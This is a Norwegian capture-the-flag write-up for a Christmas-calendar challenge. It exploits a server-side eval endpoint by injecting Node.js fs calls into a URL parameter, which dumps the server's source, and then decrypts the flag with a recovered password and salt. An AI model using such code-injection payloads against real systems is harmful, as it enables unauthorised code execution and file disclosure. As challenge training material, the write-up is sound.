# Arbitrær kode

## Oppgaven

    Se dagsbriefen: https://kalender.npst.no/12

<p><strong>Evaluering av trusler</strong></p><p>NPST har oppdaget et endepunkt som er tilgjengelig på SPST sin offentlige nettside. Det vites på dette tidspunktet ikke om dette endepunktet er tilgjengelig ved en feiltagelse, eller om det er meningen at dette skal brukes av deres agenter. En av NPSTs teknikere har påpekt at det ser ut til å være mulig å kjøre arbitrær kode via endepunktet. Det er ønskelig at en alvebetjent undersøker dette endepunktet og rapporterer eventuelle flagg via intranettet.</p><p>Url: <code>https://api.spst.no/eval?eval=`&#x3C;pre>${getFlag()}&#x3C;/pre>`</code></p><p><strong>Jule NISSEN er blitt syk</strong></p><p>Jule NISSEN er utilgjengelig de neste dagene grunnet sykdom. Det mistenkes at sykdommen er influensa ettersom Jule NISSEN har sprøyteskrekk og ikke tok vaksinen sammen med resten av NPST. Ledelsen anbefaler alle alvebetjenter å praktisere god hygiene og benytte seg av antibak for å unngå videre smitte.</p><p><strong>Julevurdering</strong></p><p>Med bakgrunn i Jule NISSENS sykdom blir julevurderingen nedgradert. Det er nå <em>mulig</em> at det blir en GOD JUL.</p>

## Løsningen

<p>Besøker vi <p><code>https://api.spst.no/eval?eval=`&#x3C;pre>${getFlag()}&#x3C;/pre>`</code></p> får vi outputen</p>

`e5a8aadb885cd0db6c98140745daa3acf2d06edc17b08f1aff6daaca93017db9dc8d7ce7579214a92ca103129d0efcdd`

Her sier oppgaven at serveren kjører arbitrær kode, og `eval` er en funksjon i flere språk som kjører kode direkte. Dette kan vi utnytte til å sjekke litt rundt på serveren!

Vi er ganske sikre på at serveren kjører på noe `node`, så vi sjekker ut API-ene for filer til `node` på [https://nodejs.org/api/fs.html](https://nodejs.org/api/fs.html)

Med API-et `fs` kan vi kalle på filsystemet, og lese ut både mappeinnhold og filinnhold. Vi sjekker ut innholdet i mappen med denne kommandoen først:

```javascript
require("fs").readDirSync("./");
```

<p>
<code>https://api.spst.no/eval?eval=`&#x3C;pre>${require("fs").readdirSync("./")}&#x3C;/pre>`</code>
</p>

Outputen til dette endepunktet er:

```plaintext
eval.js
```

Mappen inneholder altså bare denne ene Javascript-filen. Vi sjekker ut innholdet i denne med kommandoen

```javascript
require("fs").readfileSync("./eval.js");
```

<p>
<code>https://api.spst.no/eval?eval=`&#x3C;pre>${require("fs").readFileSync("./eval.js")}&#x3C;/pre>`</code>
</p>

Vi får da ut innholdet til filen:

```javascript
const crypto = require("crypto");

function getSecretPasswordNumber(n) {
    return Math.PI.toFixed(48)
        .toString()
        .split(".")[1]
        .slice(n, n + 2);
}

function getPassword(date) {
    const passwords = {
        "06.12.19": "passord-" + getSecretPasswordNumber(3),
        "07.12.19": "passord-" + getSecretPasswordNumber(5),
        "08.12.19": "passord-" + getSecretPasswordNumber(8),
        "09.12.19": "passord-" + getSecretPasswordNumber(13),
        "10.12.19": "passord-" + getSecretPasswordNumber(21)
    };
    // 06.12.19: vi har ikke flere passord etter 10. Burde vurdere alternative
    // løsninger.
    return passwords[date] || `fant ikke passord for ${date}`;
}

function formatSalt(salt) {
    return salt.toLowerCase();
}

function encrypt(input) {
    // Bruk `decrypt` for å dekryptere

    const algorithm = "aes-192-cbc";
    // 06.12.19: husk å oppdatere denne hver dag!!!
    // 09.12.19: dette var sykt slitsomt. kan vi finne en bedre løsning?
    // 11.12.19: Krypteres permanent med dagens passord nå.
    // Denne funksjonen trengs vel ikke lenger?
    const password = getPassword("10.12.19");

    // 09.12.19: pepper er ikke et salt. Når vi på sikt krypterer utenfor serveren
    // burde vi oppdatere dette til noe mer vitenskapelig korrekt.
    // Natriumhydrogensulfat?
    // 11.12.19: Oppdatert med den kjemiske formelen ;)
    const key = crypto.scryptSync(password, formatSalt("pepper"), 24);

    const iv = Buffer.alloc(16, 0);
    const cipher = crypto.createCipheriv(algorithm, key, iv);

    let encrypted = cipher.update(input, "utf8", "hex");
    encrypted += cipher.final("hex");

    return encrypted;
}

function decrypt(password, salt, input) {
    const algorithm = "aes-192-cbc";

    const key = crypto.scryptSync(password, formatSalt(salt), 24);

    const iv = Buffer.alloc(16, 0);
    const decipher = crypto.createDecipheriv(algorithm, key, iv);

    let decrypted = decipher.update(input, "hex", "utf8");
    decrypted += decipher.final("utf8");

    return decrypted;
}

function getFlag() {
    // Det er sikkert smartere å kryptere flagget først, og bare skrive inn det
    // krypterte resultatet her, enn å kryptere på serveren hver gang.
    // 11.12.19: Kryptert flagget nå. Vi kan sikkert slette encrypt-funksjonen?
    return "e5a8aadb885cd0db6c98140745daa3acf2d06edc17b08f1aff6daaca93017db9dc8d7ce7579214a92ca103129d0efcdd";
}

exports.handler = function main(event, context, callback) {
    let result = "";

    console.log(event.queryStringParameters.eval);

    // 😶
    delete process.env.AWS_SECRET_ACCESS_KEY;
    delete process.env.AWS_ACCESS_KEY_ID;
    delete process.env.AWS_SESSION_TOKEN;

    try {
        result = `${eval(event.queryStringParameters.eval)}`;
    } catch (e) {
        console.log(e);
        // 06.12.19: La til en god og informativ feilmelding.
        result = "Dette burde ikke skje...";
    }

    callback(null, {
        statusCode: 200,
        headers: {
            "Content-Type": "text/html; charset=utf-8"
        },
        body: result
    });
};
```

Etter å ha lest og forstått denne filen sitter vi igjen med følgende informasjon

-   Outputen vi får ved å kalle på `getFlag` er den krypterte utgaven av dagens flagg
-   `getPassword` henter ut dagens passord fra funksjonen `getSecretPasswordNumber`
-   Det ser ut som nummerene i inputen til `getSecretPasswordNumber` er basert på Fibonacci-sekvensen `3 5 8 13 21 ...`
-   Det kan se ut som saltet til krypteringsfunksjonen er oppdatert til å være statisk, og til å være den kjemiske formelen for "Natriumhydrogensulfat", `NaHSO4`, som lowerCases i funksjonen `formatSalt`
-   `encrypt`-funksjonen brukes ikke lenger, men siden den fortsatt ligger i kildekoden kan vi se hvordan hashen blir generert
-   `decrypt` brukes for å dekryptere hashen
-   `getFlag` ser ut til å bli oppdatert manuelt hver dag med en hash generert utenfor scriptet

Vi må finne verdiene til argumentene vi trenger å sende inn til `decrypt`-funksjonen, altså `password`, `salt` og `input`

Passordet for 11. desember får vi hvis vi kombinerer `passord-` og output for `getSecretPasswordNumber(34)`, hvor `34` er neste tall i Fibonacci-sekvensen.

Dette gir oss passordet `passord-61`

Saltet blir enkelt og greit `NAHSO4` lowercaset: `nahso4`

Nå har vi alle input vi trenger, og kan kalle på `decrypt`-funksjonen med riktig input:

```javascript
decrypt("passord-61", "nahso4", "e5a8aadb885cd0db6c98140745daa3acf2d06edc17b08f1aff6daaca93017db9dc8d7ce7579214a92ca103129d0efcdd");
```

Vi kaller på serveren med denne konstruerte URL-en:

<p>
<code>https://api.spst.no/eval?eval=`&#x3C;pre>${decrypt("passord-61", "nahso4", "e5a8aadb885cd0db6c98140745daa3acf2d06edc17b08f1aff6daaca93017db9dc8d7ce7579214a92ca103129d0efcdd")}&#x3C;/pre>`</code>
</p>

Som gir outputen:

`PST{24e592de8b20fe09938916d79b08854e}`

Da har vi funnet dagens flagg!

```javascript
Flagg: PST{24e592de8b20fe09938916d79b08854e}
```
